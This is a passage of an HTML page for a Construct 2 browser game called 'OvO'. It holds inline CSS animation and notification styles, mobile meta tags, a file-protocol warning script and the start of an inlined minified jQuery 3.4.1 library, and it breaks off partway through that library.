    transform: translate3d(100%, 0, 0);
  }
}

@keyframes slideOutRight {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(100%, 0, 0);
    transform: translate3d(100%, 0, 0);
  }
}

.slideOutRight {
  -webkit-animation-name: slideOutRight;
  animation-name: slideOutRight;
}

@-webkit-keyframes slideOutUp {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(0, -100%, 0);
    transform: translate3d(0, -100%, 0);
  }
}

@keyframes slideOutUp {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(0, -100%, 0);
    transform: translate3d(0, -100%, 0);
  }
}

.slideOutUp {
  -webkit-animation-name: slideOutUp;
  animation-name: slideOutUp;
}
#c2canvasdiv.prepared
{
	position:absolute !important;
	margin:0px !important;
	z-index:49;
}

#fakeBody
{
	position:absolute;
	z-index:999999999;	
	overflow:hidden !important;
}

 
#fakeBody #fakeCanvas
{
	position:absolute;
	top:0px;
	z-index:50;
	overflow:hidden !important;
	height:100%;
	width:100%;
}


#fakeCanvas div
{
	position:absolute;
	width:100%;
	height:100%;
	top:0px;
	left:0px;
}
#fakeCanvas div.darker
{
    -webkit-transition: background-color 100ms linear ;
    -moz-transition: background-color 100ms linear ;
    -o-transition: background-color 100ms linear ;
    -ms-transition: background-color 100ms linear ;
    transition: background-color 100ms linear ;
	background-color:rgba(0,0,0,0.3);
}

#c2canvasdiv.animated
{
	z-index:51;
}
#fakeCanvas.animated
{
	z-index:49;
}

.hidden
{
	display:none;
}
/*
 * Gritter for jQuery
 * http://www.boedesign.com/
 *
 * Copyright (c) 2012 Jordan Boesch
 * Dual licensed under the MIT and GPL licenses.
 *
 * Date:February 24, 2012
 * Version:1.7.4
 */

/* the norm */

#gritter-notice-wrapper {
    position: fixed;
    top: 20px;
    right: 20px;
    width: 301px;
    z-index: 9999;
}

#gritter-notice-wrapper.top-left {
    left: 20px;
    right: auto;
}

#gritter-notice-wrapper.bottom-right {
    top: auto;
    left: auto;
    bottom: 20px;
    right: 20px;
}

#gritter-notice-wrapper.bottom-left {
    top: auto;
    right: auto;
    bottom: 20px;
    left: 20px;
}

.gritter-item-wrapper {
    -webkit-border-radius: 0px;
    -khtml-border-radius: 0px;
    -moz-border-radius: 0px;
    -ms-border-radius: 0px;
    -o-border-radius: 0px;
    border-radius: 0px;
    background-clip: padding-box;
    background-color: rgba(0, 0, 0, 0.8);
    color: #eee;
    padding: 2px;
    position: relative;
    margin: 0 0 10px 0;
}

.gritter-item-wrapper {
    border: 5px solid rgba(255, 255, 255, 0.8);
    padding: 0;
}

.gritter-bottom {
    height: 8px;
    margin: 0;
}

.gritter-item {
    display: block;
    padding: 10px 9px 6px 9px;
    font-size: 11px;
    font-family: verdana;
}

.gritter-item p {
    padding: 0;
    margin: 0;
    word-wrap: break-word;
}

.gritter-close {
    -webkit-border-radius: 0%;
    -khtml-border-radius: 0%;
    -moz-border-radius: 0%;
    -ms-border-radius: 0%;
    -o-border-radius: 0%;
    border-radius: 0%;
    background: white url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAYAAADED76LAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAzSURBVChTYwCC/1CMDuDiMAayIgwxZAFkjALwSoIAXgXokjAMBhgCQIAihi4JA0Axhv8AUdAn2SXsGuAAAAAASUVORK5CYII=) no-repeat center;
    border: 2px solid #000;
    box-shadow: 0 0px 0px rgba(0, 0, 0, 0.75);
    display: none;
    position: absolute;
    top: 7px;
    right: 7px;
    cursor: pointer;
    width: 18px;
    height: 18px;
    text-indent: -9999em;
    outline: none;
}

.gritter-close:hover{
    box-shadow: 0 2px 2px rgba(0, 0, 0, 0.75);
}

.gritter-item-wrapper:hover .gritter-close {
    display: block;
}

.gritter-title {
    font-size: 14px;
    font-weight: bold;
    padding: 0 0 7px 0;
    display: block;
    text-shadow: 1px 1px 0 #000;
    /* Not supported by IE :( */
}

.gritter-image {
    width: 48px;
    height: 48px;
    float: left;
}

.gritter-with-image,
.gritter-without-image {
    padding: 0;
}

.gritter-with-image {
    width: 220px;
    float: right;
}

.gritter-clickable:hover {
    cursor: pointer;
}

/* for the light (white) version of the gritter notice */

.gritter-light.gritter-item-wrapper {
    background-color: rgba(255, 255, 255, 0.8);
    color: #222;
}

.gritter-light.gritter-item-wrapper {
    border-color: rgba(0, 0, 0, 0.8);
}

/* for the success version of the gritter notice */

.gritter-success.gritter-item-wrapper {
    background-color: #DFF0D8;
    color: #468847;
}

.gritter-success.gritter-item-wrapper:hover {
    border-color: #D6E9C6;
}

/* for the info version of the gritter notice */

.gritter-info.gritter-item-wrapper {
    background-color: #D9EDF7;
    color: #3A87AD;
}

.gritter-info.gritter-item-wrapper:hover {
    border-color: #BCE8F1;
}

/* for the warning version of the gritter notice */

.gritter-warning.gritter-item-wrapper {
    background-color: #FCF8E3;
    color: #C09853;
}

.gritter-warning.gritter-item-wrapper:hover {
    border-color: #FBEED5;
}

/* for the error version of the gritter notice */

.gritter-error.gritter-item-wrapper {
    background-color: #F2DEDE;
    color: #B94A48;
}

.gritter-error.gritter-item-wrapper:hover {
    border-color: #EED3D7;
}

/* for the red version of the gritter notice */

.gritter-red.gritter-item-wrapper {
    background-color: #F78B83;
    color: #912323;
}

.gritter-red.gritter-item-wrapper:hover {
    border-color: #D95252;
}

/* for the yellow version of the gritter notice */

.gritter-yellow.gritter-item-wrapper {
    background-color: #FFFFA3;
    color: #555;
}

.gritter-yellow.gritter-item-wrapper:hover {
    border-color: #F1D031;
}

/* for the blue version of the gritter notice */

.gritter-blue.gritter-item-wrapper {
    background-color: #E5F6FE;
    color: #5E99BD;
}

.gritter-blue.gritter-item-wrapper:hover {
    border-color: #ADD9ED;
}

/* for the green version of the gritter notice */

.gritter-green.gritter-item-wrapper {
    background-color: #CAED9E;
    color: #3F6219;
}

.gritter-green.gritter-item-wrapper:hover {
    border-color: #90D93F;
}

.gritter-light .gritter-title,
.gritter-success .gritter-title,
.gritter-info .gritter-title,
.gritter-warning .gritter-title,
.gritter-error .gritter-title,
.gritter-red .gritter-title,
.gritter-yellow .gritter-title,
.gritter-blue .gritter-title,
.gritter-green .gritter-title {
    text-shadow: none;
}
    </style>
    <meta charset="UTF-8">
	<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
	<title>OvO</title>

	
	<!-- Allow fullscreen mode on iOS devices. (These are Apple specific meta tags.) -->
	<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, minimal-ui" name="viewport">
	<meta content="yes" name="apple-mobile-web-app-capable">
	<meta content="black" name="apple-mobile-web-app-status-bar-style">
	<meta content="true" name="HandheldFriendly">
	
	<!-- Chrome for Android web app tags -->
	<meta content="yes" name="mobile-web-app-capable">

    <!-- All margins and padding must be zero for the canvas to fill the screen. -->
	
	
	
	
	

</head><body dir="ltr"> 
	<div id="fb-root"></div>
	
	<script>
	// Issue a warning if trying to preview an exported project on disk.
	(function(){
		// Check for running exported on file protocol
		if (window.location.protocol.substr(0, 4) === "file")
		{
			alert("Exported games won't work until you upload them. (When running on the file:/// protocol, browsers block many features from working for security reasons.)");
		}
	})();
	</script>
	
	<!-- The canvas must be inside a div called c2canvasdiv -->
	<div id="c2canvasdiv">
	
		<!-- The canvas the project will render to.  If you change its ID, don't forget to change the
		ID the runtime looks for in the jQuery events above (ready() and cr_sizeCanvas()). -->
		<canvas height="640" id="c2canvas" width="640">
			<!-- This text is displayed if the visitor's browser does not support HTML5.
			You can change it, but it is a good idea to link to a description of a browser
			and provide some links to download some popular HTML5-compatible browsers. -->
			<h1>Your browser does not appear to support HTML5.  Try upgrading your browser to the latest version.  <a href="http://www.whatbrowser.org/">What is a browser?</a>
			<br><br><a href="http://www.microsoft.com/windows/internet-explorer/default.aspx">Microsoft Internet Explorer</a><br>
			<a href="http://www.mozilla.com/firefox/">Mozilla Firefox</a><br>
			<a href="http://www.google.com/chrome/">Google Chrome</a><br>
			<a href="http://www.apple.com/safari/download/">Apple Safari</a></h1>
		</canvas>
		
	</div>
	
	<!-- Pages load faster with scripts at the bottom -->
	
	<!-- Construct 2 exported games require jQuery. -->
	<script>
    /*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */
!function(e,t){"use strict";"object"==typeof module&&"object"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error("jQuery requires a window with a document");return t(e)}:t(e)}("undefined"!=typeof window?window:this,function(C,e){"use strict";var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=a.call(Object),y={},m=function(e){return"function"==typeof e&&"number"!=typeof e.nodeType},x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};function b(e,t,n){var r,i,o=(n=n||E).createElement("script");if(o.text=e,t)for(r in c)(i=t[r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode.removeChild(o)}function w(e){return null==e?e+"":"object"==typeof e||"function"==typeof e?n[o.call(e)]||"object":typeof e}var f="3.4.1",k=function(e,t){return new k.fn.init(e,t)},p=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;function d(e){var t=!!e&&"length"in e&&e.length,n=w(e);return!m(e)&&!x(e)&&("array"===n||0===t||"number"==typeof t&&0<t&&t-1 in e)}k.fn=k.prototype={jquery:f,constructor:k,length:0,toArray:function(){return s.call(this)},get:function(e){return null==e?s.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=k.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return k.each(this,e)},map:function(n){return this.pushStack(k.map(this,function(e,t){return n.call(e,t,e)}))},slice:function(){return this.pushStack(s.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(0<=n&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:u,sort:t.sort,splice:t.splice},k.extend=k.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for("boolean"==typeof a&&(l=a,a=arguments[s]||{},s++),"object"==typeof a||m(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)r=e[t],"__proto__"!==t&&a!==r&&(l&&r&&(k.isPlainObject(r)||(i=Array.isArray(r)))?(n=a[t],o=i&&!Array.isArray(n)?[]:i||k.isPlainObject(n)?n:{},i=!1,a[t]=k.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},k.extend({expando:"jQuery"+(f+Math.random()).replace(/\D/g,""),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||"[object Object]"!==o.call(e))&&(!(t=r(e))||"function"==typeof(n=v.call(t,"constructor")&&t.constructor)&&a.call(n)===l)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e,t){b(e,{nonce:t&&t.nonce})},each:function(e,t){var n,r=0;if(d(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?"":(e+"").replace(p,"")},makeArray:function(e,t){var n=t||[];return null!=e&&(d(Object(e))?k.merge(n,"string"==typeof e?[e]:e):u.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:i.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r=[],i=0,o=e.length,a=!n;i<o;i++)!t(e[i],i)!==a&&r.push(e[i]);return r},map:function(e,t,n){var r,i,o=0,a=[];if(d(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&a.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&a.push(i);return g.apply([],a)},guid:1,support:y}),"function"==typeof Symbol&&(k.fn[Symbol.iterator]=t[Symbol.iterator]),k.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),function(e,t){n["[object "+t+"]"]=t.toLowerCase()});var h=function(n){var e,d,b,o,i,h,f,g,w,u,l,T,C,a,E,v,s,c,y,k="sizzle"+1*new Date,m=n.document,S=0,r=0,p=ue(),x=ue(),N=ue(),A=ue(),D=function(e,t){return e===t&&(l=!0),0},j={}.hasOwnProperty,t=[],q=t.pop,L=t.push,H=t.push,O=t.slice,P=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},R="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",M="[\\x20\\t\\r\\n\\f]",I="(?:\\\\.|[\\w-]|[^\0-\\xa0])+",W="\\["+M+"*("+I+")(?:"+M+"*([*^$|!~]?=)"+M+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+I+"))|)"+M+"*\\]",$=":("+I+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+W+")*)|.*)\\)|)",F=new RegExp(M+"+","g"),B=new RegExp("^"+M+"+|((?:^|[^\\\\])(?:\\\\.)*)"+M+"+$","g"),_=new RegExp("^"+M+"*,"+M+"*"),z=new RegExp("^"+M+"*([>+~]|"+M+")"+M+"*"),U=new RegExp(M+"|>"),X=new RegExp($),V=new RegExp("^"+I+"$"),G={ID:new RegExp("^#("+I+")"),CLASS:new RegExp("^\\.("+I+")"),TAG:new RegExp("^("+I+"|[*])"),ATTR:new RegExp("^"+W),PSEUDO:new RegExp("^"+$),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+M+"*(even|odd|(([+-]|)(\\d*)n|)"+M+"*(?:([+-]|)"+M+"*(\\d+)|))"+M+"*\\)|)","i"),bool:new RegExp("^(?:"+R+")$","i"),needsContext:new RegExp("^"+M+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+M+"*((?:-\\d)?\\d*)"+M+"*\\)|)(?=[^-]|$)","i")},Y=/HTML$/i,Q=/^(?:input|select|textarea|button)$/i,J=/^h\d$/i,K=/^[^{]+\{\s*\[native \w/,Z=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,ee=/[+~]/,te=new RegExp("\\\\([\\da-f]{1,6}"+M+"?|("+M+")|.)","ig"),ne=function(e,t,n){var r="0x"+t-65536;return r!=r||n?t:r<0?String.fromCharCode(r+65536):String.fromCharCode(r>>10|55296,1023&r|56320)},re=/([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,ie=function(e,t){return t?"\0"===e?"\ufffd":e.slice(0,-1)+"\\"+e.charCodeAt(e.length-1).toString(16)+" ":"\\"+e},oe=function(){T()},ae=be(function(e){return!0===e.disabled&&"fieldset"===e.nodeName.toLowerCase()},{dir:"parentNode",next:"legend"});try{H.apply(t=O.call(m.childNodes),m.childNodes),t[m.childNodes.length].nodeType}catch(e){H={apply:t.length?function(e,t){L.apply(e,O.call(t))}:function(e,t){var n=e.length,r=0;while(e[n++]=t[r++]);e.length=n-1}}}function se(t,e,n,r){var i,o,a,s,u,l,c,f=e&&e.ownerDocument,p=e?e.nodeType:9;if(n=n||[],"string"!=typeof t||!t||1!==p&&9!==p&&11!==p)return n;if(!r&&((e?e.ownerDocument||e:m)!==C&&T(e),e=e||C,E)){if(11!==p&&(u=Z.exec(t)))if(i=u[1]){if(9===p){if(!(a=e.getElementById(i)))return n;if(a.id===i)return n.push(a),n}else if(f&&(a=f.getElementById(i))&&y(e,a)&&a.id===i)return n.push(a),n}else{if(u[2])return H.apply(n,e.getElementsByTagName(t)),n;if((i=u[3])&&d.getElementsByClassName&&e.getElementsByClassName)return H.apply(n,e.getElementsByClassName(i)),n}if(d.qsa&&!A[t+" "]&&(!v||!v.test(t))&&(1!==p||"object"!==e.nodeName.toLowerCase())){if(c=t,f=e,1===p&&U.test(t)){(s=e.getAttribute("id"))?s=s.replace(re,ie):e.setAttribute("id",s=k),o=(l=h(t)).length;while(o--)l[o]="#"+s+" "+xe(l[o]);c=l.join(","),f=ee.test(t)&&ye(e.parentNode)||e}try{return H.apply(n,f.querySelectorAll(c)),n}catch(e){A(t,!0)}finally{s===k&&e.removeAttribute("id")}}}return g(t.replace(B,"$1"),e,n,r)}function ue(){var r=[];return function e(t,n){return r.push(t+" ")>b.cacheLength&&delete e[r.shift()],e[t+" "]=n}}function le(e){return e[k]=!0,e}function ce(e){var t=C.createElement("fieldset");try{return!!e(t)}catch(e){return!1}finally{t.parentNode&&t.parentNode.removeChild(t),t=null}}function fe(e,t){var n=e.split("|"),r=n.length;while(r--)b.attrHandle[n[r]]=t}function pe(e,t){var n=t&&e,r=n&&1===e.nodeType&&1===t.nodeType&&e.sourceIndex-t.sourceIndex;if(r)return r;if(n)while(n=n.nextSibling)if(n===t)return-1;return e?1:-1}function de(t){return function(e){return"input"===e.nodeName.toLowerCase()&&e.type===t}}function he(n){return function(e){var t=e.nodeName.toLowerCase();return("input"===t||"button"===t)&&e.type===n}}function ge(t){return function(e){return"form"in e?e.parentNode&&!1===e.disabled?"label"in e?"label"in e.parentNode?e.parentNode.disabled===t:e.disabled===t:e.isDisabled===t||e.isDisabled!==!t&&ae(e)===t:e.disabled===t:"label"in e&&e.disabled===t}}function ve(a){return le(function(o){return o=+o,le(function(e,t){var n,r=a([],e.length,o),i=r.length;while(i--)e[n=r[i]]&&(e[n]=!(t[n]=e[n]))})})}function ye(e){return e&&"undefined"!=typeof e.getElementsByTagName&&e}for(e in d=se.support={},i=se.isXML=function(e){var t=e.namespaceURI,n=(e.ownerDocument||e).documentElement;return!Y.test(t||n&&n.nodeName||"HTML")},T=se.setDocument=function(e){var t,n,r=e?e.ownerDocument||e:m;return r!==C&&9===r.nodeType&&r.documentElement&&(a=(C=r).documentElement,E=!i(C),m!==C&&(n=C.defaultView)&&n.top!==n&&(n.addEventListener?n.addEventListener("unload",oe,!1):n.attachEvent&&n.attachEvent("onunload",oe)),d.attributes=ce(function(e){return e.className="i",!e.getAttribute("className")}),d.getElementsByTagName=ce(function(e){return e.appendChild(C.createComment("")),!e.getElementsByTagName("*").length}),d.getElementsByClassName=K.test(C.getElementsByClassName),d.getById=ce(function(e){return a.appendChild(e).id=k,!C.getElementsByName||!C.getElementsByName(k).length}),d.getById?(b.filter.ID=function(e){var t=e.replace(te,ne);return function(e){return e.getAttribute("id")===t}},b.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&E){var n=t.getElementById(e);return n?[n]:[]}}):(b.filter.ID=function(e){var n=e.replace(te,ne);return function(e){var t="undefined"!=typeof e.getAttributeNode&&e.getAttributeNode("id");return t&&t.value===n}},b.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&E){var n,r,i,o=t.getElementById(e);if(o){if((n=o.getAttributeNode("id"))&&n.value===e)return[o];i=t.getElementsByName(e),r=0;while(o=i[r++])if((n=o.getAttributeNode("id"))&&n.value===e)return[o]}return[]}}),b.find.TAG=d.getElementsByTagName?function(e,t){return"undefined"!=typeof t.getElementsByTagName?t.getElementsByTagName(e):d.qsa?t.querySelectorAll(e):void 0}:function(e,t){var n,r=[],i=0,o=t.getElementsByTagName(e);if("*"===e){while(n=o[i++])1===n.nodeType&&r.push(n);return r}return o},b.find.CLASS=d.getElementsByClassName&&function(e,t){if("undefined"!=typeof t.getElementsByClassName&&E)return t.getElementsByClassName(e)},s=[],v=[],(d.qsa=K.test(C.querySelectorAll))&&(ce(function(e){a.appendChild(e).innerHTML="<a id='"+k+"'></a><select id='"+k+"-\r\\' msallowcapture=''><option selected=''></option></select>",e.querySelectorAll("[msallowcapture^='']").length&&v.push("[*^$]="+M+"*(?:''|\"\")"),e.querySelectorAll("[selected]").length||v.push("\\["+M+"*(?:value|"+R+")"),e.querySelectorAll("[id~="+k+"-]").length||v.push("~="),e.querySelectorAll(":checked").length||v.push(":checked"),e.querySelectorAll("a#"+k+"+*").length||v.push(".#.+[+~]")}),ce(function(e){e.innerHTML="<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";var t=C.createElement("input");t.setAttribute("type","hidden"),e.appendChild(t).setAttribute("name","D"),e.querySelectorAll("[name=d]").length&&v.push("name"+M+"*[*^$|!~]?="),2!==e.querySelectorAll(":enabled").length&&v.push(":enabled",":disabled"),a.appendChild(e).disabled=!0,2!==e.querySelectorAll(":disabled").length&&v.push(":enabled",":disabled"),e.querySelectorAll("*,:x"),v.push(",.*:")})),(d.matchesSelector=K.test(c=a.matches||a.webkitMatchesSelector||a.mozMatchesSelector||a.oMatchesSelector||a.msMatchesSelector))&&ce(function(e){d.disconnectedMatch=c.call(e,"*"),c.call(e,"[s!='']:x"),s.push("!=",$)}),v=v.length&&new RegExp(v.join("|")),s=s.length&&new RegExp(s.join("|")),t=K.test(a.compareDocumentPosition),y=t||K.test(a.contains)?function(e,t){var n=9===e.nodeType?e.documentElement:e,r=t&&t.parentNode;return e===r||!(!r||1!==r.nodeType||!(n.contains?n.contains(r):e.compareDocumentPosition&&16&e.compareDocumentPosition(r)))}:function(e,t){if(t)while(t=t.parentNode)if(t===e)return!0;return!1},D=t?function(e,t){if(e===t)return l=!0,0;var n=!e.compareDocumentPosition-!t.compareDocumentPosition;return n||(1&(n=(e.ownerDocument||e)===(t.ownerDocument||t)?e.compareDocumentPosition(t):1)||!d.sortDetached&&t.compareDocumentPosition(e)===n?e===C||e.ownerDocument===m&&y(m,e)?-1:t===C||t.ownerDocument===m&&y(m,t)?1:u?P(u,e)-P(u,t):0:4&n?-1:1)}:function(e,t){if(e===t)return l=!0,0;var n,r=0,i=e.parentNode,o=t.parentNode,a=[e],s=[t];if(!i||!o)return e===C?-1:t===C?1:i?-1:o?1:u?P(u,e)-P(u,t):0;if(i===o)return pe(e,t);n=e;while(n=n.parentNode)a.unshift(n);n=t;while(n=n.parentNode)s.unshift(n);while(a[r]===s[r])r++;return r?pe(a[r],s[r]):a[r]===m?-1:s[r]===m?1:0}),C},se.matches=function(e,t){return se(e,null,null,t)},se.matchesSelector=function(e,t){if((e.ownerDocument||e)!==C&&T(e),d.matchesSelector&&E&&!A[t+" "]&&(!s||!s.test(t))&&(!v||!v.test(t)))try{var n=c.call(e,t);if(n||d.disconnectedMatch||e.document&&11!==e.document.nodeType)return n}catch(e){A(t,!0)}return 0<se(t,C,null,[e]).length},se.contains=function(e,t){return(e.ownerDocument||e)!==C&&T(e),y(e,t)},se.attr=function(e,t){(e.ownerDocument||e)!==C&&T(e);var n=b.attrHandle[t.toLowerCase()],r=n&&j.call(b.attrHandle,t.toLowerCase())?n(e,t,!E):void 0;return void 0!==r?r:d.attributes||!E?e.getAttribute(t):(r=e.getAttributeNode(t))&&r.specified?r.value:null},se.escape=function(e){return(e+"").replace(re,ie)},se.error=function(e){throw new Error("Syntax error, unrecognized expression: "+e)},se.uniqueSort=function(e){var t,n=[],r=0,i=0;if(l=!d.detectDuplicates,u=!d.sortStable&&e.slice(0),e.sort(D),l){while(t=e[i++])t===e[i]&&(r=n.push(i));while(r--)e.splice(n[r],1)}return u=null,e},o=se.getText=function(e){var t,n="",r=0,i=e.nodeType;if(i){if(1===i||9===i||11===i){if("string"==typeof e.textContent)return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)n+=o(e)}else if(3===i||4===i)return e.nodeValue}else while(t=e[r++])n+=o(t);return n},(b=se.selectors={cacheLength:50,createPseudo:le,match:G,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){return e[1]=e[1].replace(te,ne),e[3]=(e[3]||e[4]||e[5]||"").replace(te,ne),"~="===e[2]&&(e[3]=" "+e[3]+" "),e.slice(0,4)},CHILD:function(e){return e[1]=e[1].toLowerCase(),"nth"===e[1].slice(0,3)?(e[3]||se.error(e[0]),e[4]=+(e[4]?e[5]+(e[6]||1):2*("even"===e[3]||"odd"===e[3])),e[5]=+(e[7]+e[8]||"odd"===e[3])):e[3]&&se.error(e[0]),e},PSEUDO:function(e){var t,n=!e[6]&&e[2];return G.CHILD.test(e[0])?null:(e[3]?e[2]=e[4]||e[5]||"":n&&X.test(n)&&(t=h(n,!0))&&(t=n.indexOf(")",n.length-t)-n.length)&&(e[0]=e[0].slice(0,t),e[2]=n.slice(0,t)),e.slice(0,3))}},filter:{TAG:function(e){var t=e.replace(te,ne).toLowerCase();return"*"===e?function(){return!0}:function(e){return e.nodeName&&e.nodeName.toLowerCase()===t}},CLASS:function(e){var t=p[e+" "];return t||(t=new RegExp("(^|"+M+")"+e+"("+M+"|$)"))&&p(e,function(e){return t.test("string"==typeof e.className&&e.className||"undefined"!=typeof e.getAttribute&&e.getAttribute("class")||"")})},ATTR:function(n,r,i){return function(e){var t=se.attr(e,n);return null==t?"!="===r:!r||(t+="","="===r?t===i:"!="===r?t!==i:"^="===r?i&&0===t.indexOf(i):"*="===r?i&&-1<t.indexOf(i):"$="===r?i&&t.slice(-i.length)===i:"~="===r?-1<(" "+t.replace(F," ")+" ").indexOf(i):"|="===r&&(t===i||t.slice(0,i.length+1)===i+"-"))}},CHILD:function(h,e,t,g,v){var y="nth"!==h.slice(0,3),m="last"!==h.slice(-4),x="of-type"===e;return 1===g&&0===v?function(e){return!!e.parentNode}:function(e,t,n){var r,i,o,a,s,u,l=y!==m?"nextSibling":"previousSibling",c=e.parentNode,f=x&&e.nodeName.toLowerCase(),p=!n&&!x,d=!1;if(c){if(y){while(l){a=e;while(a=a[l])if(x?a.nodeName.toLowerCase()===f:1===a.nodeType)return!1;u=l="only"===h&&!u&&"nextSibling"}return!0}if(u=[m?c.firstChild:c.lastChild],m&&p){d=(s=(r=(i=(o=(a=c)[k]||(a[k]={}))[a.uniqueID]||(o[a.uniqueID]={}))[h]||[])[0]===S&&r[1])&&r[2],a=s&&c.childNodes[s];while(a=++s&&a&&a[l]||(d=s=0)||u.pop())if(1===a.nodeType&&++d&&a===e){i[h]=[S,s,d];break}}else if(p&&(d=s=(r=(i=(o=(a=e)[k]||(a[k]={}))[a.uniqueID]||(o[a.uniqueID]={}))[h]||[])[0]===S&&r[1]),!1===d)while(a=++s&&a&&a[l]||(d=s=0)||u.pop())if((x?a.nodeName.toLowerCase()===f:1===a.nodeType)&&++d&&(p&&((i=(o=a[k]||(a[k]={}))[a.uniqueID]||(o[a.uniqueID]={}))[h]=[S,d]),a===e))break;return(d-=v)===g||d%g==0&&0<=d/g}}},PSEUDO:function(e,o){var t,a=b.pseudos[e]||b.setFilters[e.toLowerCase()]||se.error("unsupported pseudo: "+e);return a[k]?a(o):1<a.length?(t=[e,e,"",o],b.setFilters.hasOwnProperty(e.toLowerCase())?le(function(e,t){var n,r=a(e,o),i=r.length;while(i--)e[n=P(e,r[i])]=!(t[n]=r[i])}):function(e){return a(e,0,t)}):a}},pseudos:{not:le(function(e){var r=[],i=[],s=f(e.replace(B,"$1"));return s[k]?le(function(e,t,n,r){var i,o=s(e,null,r,[]),a=e.length;while(a--)(i=o[a])&&(e[a]=!(t[a]=i))}):function(e,t,n){return r[0]=e,s(r,null,n,i),r[0]=null,!i.pop()}}),has:le(function(t){return function(e){return 0<se(t,e).length}}),contains:le(function(t){return t=t.replace(te,ne),function(e){return-1<(e.textContent||o(e)).indexOf(t)}}),lang:le(function(n){return V.test(n||"")||se.error("unsupported lang: "+n),n=n.replace(te,ne).toLowerCase(),function(e){var t;do{if(t=E?e.lang:e.getAttribute("xml:lang")||e.getAttribute("lang"))return(t=t.toLowerCase())===n||0===t.indexOf(n+"-")}while((e=e.parentNode)&&1===e.nodeType);return!1}}),target:function(e){var t=n.location&&n.location.hash;return t&&t.slice(1)===e.id},root:function(e){return e===a},focus:function(e){return e===C.activeElement&&(!C.hasFocus||C.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:ge(!1),disabled:ge(!0),checked:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&!!e.checked||"option"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,!0===e.selected},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeType<6)return!1;return!0},parent:function(e){return!b.pseudos.empty(e)},header:function(e){return J.test(e.nodeName)},input:function(e){return Q.test(e.nodeName)},button:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&"button"===e.type||"button"===t},text:function(e){var t;return"input"===e.nodeName.toLowerCase()&&"text"===e.type&&(null==(t=e.getAttribute("type"))||"text"===t.toLowerCase())},first:ve(function(){return[0]}),last:ve(function(e,t){return[t-1]}),eq:ve(function(e,t,n){return[n<0?n+t:n]}),even:ve(function(e,t){for(var n=0;n<t;n+=2)e.push(n);return e}),odd:ve(function(e,t){for(var n=1;n<t;n+=2)e.push(n);return e}),lt:ve(function(e,t,n){for(var r=n<0?n+t:t<n?t:n;0<=--r;)e.push(r);return e}),gt:ve(function(e,t,n){for(var r=n<0?n+t:n;++r<t;)e.push(r);return e})}}).pseudos.nth=b.pseudos.eq,{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})b.pseudos[e]=de(e);for(e in{submit:!0,reset:!0})b.pseudos[e]=he(e);function 